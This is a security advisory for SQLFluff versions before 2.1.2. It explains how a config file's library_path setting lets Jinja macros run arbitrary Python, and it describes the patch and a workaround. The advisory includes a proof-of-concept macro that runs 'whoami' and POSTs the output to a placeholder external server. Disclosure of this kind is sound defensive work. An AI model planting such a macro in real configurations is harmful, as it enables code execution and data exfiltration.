# Potential vulnerability for users with access to config file, using `libary\_path` to call arbitrary python code.

Moderate

[alanmcruickshank](/alanmcruickshank)
published
GHSA-jqhc-m2j3-fjrx
Jul 6, 2023

## Package

pip

sqlfluff
([pip](/advisories?query=ecosystem%3Apip))

## Affected versions

<2.1.2

## Patched versions

2.1.2

## Description

### Impact

In environments where untrusted users have access to the config files (e.g. `.sqlfluff`), there is a potential security vulnerability where those users could use the `library_path` config value to allow arbitrary python code to be executed via macros. Jinja macros are executed within a [sandboxed environment](https://docs.snowflake.com/en/sql-reference/sql/show-warehouses) but the following example shows how an external url might be called and used to reveal internal information to an external listener:

```
[sqlfluff:templater:jinja]
library_path = /usr/lib/python3.9/http

[sqlfluff:templater:jinja:macros]
a_macro_def = {{client.HTTPSConnection('<SOME_EXTERNAL_SERVER_YOU_CONTROL>').request('POST', '/', server.os.popen('whoami').read())}}
```

For many users who use SQLFluff in the context of an environment where all users *already have fairly escalated privileges*, this may not be an issue - however in larger user bases, or where SQLFluff is bundled into another tool where developers still wish to give users access to supply their on *rule configuration*, this may be an issue.

### Patches

The 2.1.2 release offers the ability for the `library_path` argument to be overwritten on the command line by using [the `--library-path` option](https://docs.sqlfluff.com/en/stable/cli.html#cmdoption-sqlfluff-lint-library-path). This overrides any values provided in the config files and effectively prevents this route of attack for users which have access to the config file, but not to the scripts which call the SQLFluff CLI directly. A similar option is provided for the Python API, where users also have a greater ability to further customise or override configuration as necessary.

Unless `library_path` is explicitly required, we recommend using the option `--library-path none` when invoking SQLFluff which will disable the `library-path` option entirely regardless of the options set in the configuration file or via inline config directives.

### Workarounds

Limiting access to - or otherwise validating configuration files before they are ingested by SQLFluff will provide a similar effect and does not require upgrade.

# CVSS v3 base metrics

Attack vector:
More severe the more the remote (logically and physically) an attacker can be in order to exploit the vulnerability.

Attack complexity:
More severe for the least complex attacks.

Privileges required:
More severe if no privileges are required.

User interaction:
More severe when no user interaction is required.

Scope:
More severe when a scope change occurs, e.g. one vulnerable component impacts resources in components beyond its security scope.

Confidentiality:
More severe when loss of data confidentiality is highest, measuring the level of data access available to an unauthorized user.

Integrity:
More severe when loss of data integrity is the highest, measuring the consequence of data modification possible by an unauthorized user.

Availability:
More severe when the loss of impacted component availability is highest.

## Highlights

This release resolves compatibility issues with a set of `dbt-core` versions.

* `dbt-core` 1.5.2 onwards is now properly supported.
* support for `dbt-core` 1.1 to 1.4 has now been re-enabled after support had to be abandoned a few releases ago.

NOTE: We cannot guarantee that SQLFluff will always continue to remain compatible with all dbt versions, particularly as the folks at dbt-labs have often backported breaking changes to their internal APIs to previous versions of `dbt-core`. This release does at least bring more extensive internal testing to catch when this does occur to allow our community to react.

This release fixes also resolves a potential security issue for when using external libraries (and the `library_path` config setting), and also contains various dialect improvements.
